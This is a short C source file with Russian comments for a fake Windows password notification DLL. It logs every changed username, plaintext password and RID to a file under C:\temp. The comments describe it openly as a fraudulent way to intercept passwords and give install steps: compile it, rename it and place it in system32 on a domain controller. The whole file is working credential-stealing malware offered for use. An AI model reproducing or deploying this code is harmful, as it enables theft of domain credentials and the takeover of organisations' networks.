/* Перехват файлов поролей */
// При помощи поддельной динамической библиотеки (DLL) можно мошенническим путем перехватить пароли в виде незашифрованного текста.
// Объект нападения Win
/* Вначале необходимо скомпилировать этот код, затем ее надо просто переименовать изменив расширение на DLL и устоновить данный файл в каталоге
 system32 на главном контроллере домена. Код можно модифицировать ...*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

struct UNI_STRING {
    USHORT len;
    USHORT maxlen;
    WCHAR *buff;
};

static HANDLE fh;
BOOLEAN _stdcall InitializeChangeNotify()
{
    DWORD wrote;
    fh = CreateFile("C:\\temp\\pwdchange.out",
		    GENERIC_WRITE,
		    FILE_SHARE_READ |
		    FILE_SHARE_WRITE,
		    0,
		    CREATE_ALWAYS,
		    FILE_ATTRIBUTE_NORMAL |
		    FILE_FLAG_WRITE_THROUGH,
		    0);
    WriteFile(fh,"InitializeChangeNotify started\n",
	      31, &wrote, 0);
    return TRUE;
}

LONG _stdcall PasswordChangeNotify(
    struct UNI_STRING *user,
    ULONG rid,
    struct UNI_STRING *passwd)
{
    DWORD wrote;
    WCHAR wbuf[200];
    char buf[512];
    char buf1[200];
    DWORD len;

    memcpy(wbuf, user->buff, user->len);
    len = user->len/sizeof(WCHAR);
    wbuf[len] = 0;
    wcstombs(buf1, wbuf,199);
    sprintf(buf, "User = %s : ", buf1);
    WriteFile(fh, buf, strlen(buf), &wrote, 0);

    memcpy(wbuf, passwd->buff, passwd->len);
    len = passwd->len/sizeof(WCHAR);
    wbuf[len] = 0;
    wcstombs(buf1, wbuf, 199);
    sprintf(buf, "Password = %s : ", buf1);
    WriteFile(fh, buf, strlen(buf), &wrote, 0);

    sprintf(buf, "RID = %x\n", rid);
    WriteFile(fh, buf, strlen(buf), &wrote, 0);

    return 0L;
}
